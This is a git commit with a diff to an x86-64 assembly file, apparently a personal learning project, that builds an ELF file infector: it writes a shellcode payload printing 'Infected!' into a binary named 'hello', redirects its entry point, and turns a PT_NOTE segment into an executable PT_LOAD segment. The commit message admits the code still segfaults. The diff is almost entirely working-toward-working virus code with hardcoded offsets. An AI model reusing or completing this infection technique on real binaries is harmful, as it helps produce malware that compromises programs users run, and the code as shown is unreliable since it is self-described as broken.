4149af2058bcce93029910415f60c1f93745c526
anissWith2s <aniss.h212@gmail.com>
2024-11-27 22:03:28 +0100

    Nouvel essai, nouvel echec, toujours des segfault. Une reussite : passage ptnote en ptload en assembleur

--- shellcode_ptnoteTOptloadGood_butSegFAult.asm
+++ shellcode_ptnoteTOptloadGood_butSegFAult.asm
@@ -9,11 +9,25 @@ shellcode:
     mov rdx, 9              ; Longueur du message
     syscall
 
-_start:
+    ; retour à l'entry point d'origine
+    lea rax, [rel orig_entry]
+    mov rbx, [rax]
+    add rbx, [rel base_addr]
+    jmp rbx
 
-    ; Ouverture du fichier ELF en écriture
+shellcode_len equ $ - shellcode
+
+_start:
+    ; calculer la base dynamique 
+    call get_base
+get_base:
+    pop rax
+    sub rax, get_base - _start
+    mov [rel base_addr], rax
+
+    ; Ouvrir le fichier en écriture
     mov rax, 2              ; syscall: open
-    lea rdi, [rel filename] ; Nom du fichier
+    lea rdi, [rel filename] ; Nom du fichier ELF
     mov rsi, 2              ; O_RDWR (lecture-écriture)
     xor rdx, rdx            ; Pas de flags supplémentaires
     syscall
@@ -21,57 +35,59 @@ _start:
     js exit_error
     mov r8, rax             ; Sauvegarde du file descriptor
 
-    ; Modifier le type du segment PT_NOTE (0x04 -> 0x01)
-    mov rax, 8              ; syscall: lseek
+    ; injecter le shellcode a l'offset 0x368
+    mov rax, 8
     mov rdi, r8
-    mov rsi, 0x120          ; Offset de l'en-tête du segment
+    mov rsi, 0x36C
     xor rdx, rdx
     syscall
 
-    mov rax, 1              ; syscall: write
-    mov rdi, r8
-    lea rsi, [rel new_type] ; Nouveau type PT_LOAD
-    mov rdx, 4              ; Taille (4 octets)
-    syscall
-
-    ; Modifier les permissions du segment (0x04 -> 0x05)
-    mov rax, 8              ; syscall: lseek
-    mov rdi, r8
-    mov rsi, 0x138          ; Offset des permissions
-    xor rdx, rdx
-    syscall
-
-    mov rax, 1              ; syscall: write
-    mov rdi, r8
-    lea rsi, [rel new_flags] ; Permissions R E
-    mov rdx, 4
-    syscall
-
-    ; Injecter le shellcode à l'offset 0x368
-    mov rax, 8              ; syscall: lseek
-    mov rdi, r8
-    mov rsi, 872            ; 0x368 en décimal
-    xor rdx, rdx
-    syscall
-
-    mov rax, 1              ; syscall: write
+    mov rax, 1
     mov rdi, r8
     lea rsi, [rel shellcode]
     mov rdx, shellcode_len
     syscall
 
-    ; Modifier l'entry point pour pointer vers 0x368
+
+    ; Modifier l’entry point pour pointer vers 0x1100
     mov rax, 8              ; syscall: lseek
     mov rdi, r8
-    mov rsi, 24             ; Offset de l'entry point (0x18 en décimal)
+    mov rsi, 24             ; Offset de l'entry point dans l'en-tête ELF
     xor rdx, rdx
     syscall
 
     mov rax, 1              ; syscall: write
     mov rdi, r8
     lea rsi, [rel new_entry]
-    mov rdx, 8              ; Taille (8 octets)
+    mov rdx, 8              ; Taille (8 octets pour ELF64)
     syscall
+
+    ; Changer le type PT_NOTE en PT_LOAD
+    mov rax, 8              ; syscall: lseek
+    mov rdi, r8
+    mov rsi, 0x200          ; Offset du 9e segment
+    xor rdx, rdx
+    syscall
+
+    mov rax, 1              ; syscall: write
+    mov rdi, r8
+    lea rsi, [rel pt_load_type]
+    mov rdx, 4              ; Taille du type (4 octets)
+    syscall
+
+    ; Modifier les permissions en lecture et exécution (R E)
+    mov rax, 8              ; syscall: lseek
+    mov rdi, r8
+    mov rsi, 0x200 + 4     ; Offset des permissions
+    xor rdx, rdx
+    syscall
+
+    mov rax, 1              ; syscall: write
+    mov rdi, r8
+    lea rsi, [rel permissions]
+    mov rdx, 4              ; Taille des permissions (4 octets)
+    syscall
+
 
     ; Fermer le fichier et terminer
     mov rax, 3              ; syscall: close
@@ -87,9 +103,12 @@ exit_error:
     mov rdi, 1              ; Code d'erreur
     syscall
 
+section .data
 msg db "Infected!", 0
 filename db "hello", 0
-new_type db 0x01, 0x00, 0x00, 0x00
-new_flags db 0x05, 0x00, 0x00, 0x00
-new_entry dq 0x368           ; Nouvelle adresse virtuelle
-shellcode_len equ $ - shellcode
+new_entry dq 0x36C
+orig_entry dq 0
+base_addr dq 0
+pt_load_type dd 0x1         ; Type PT_LOAD
+permissions dd 0x5          ; Permissions R E
+    
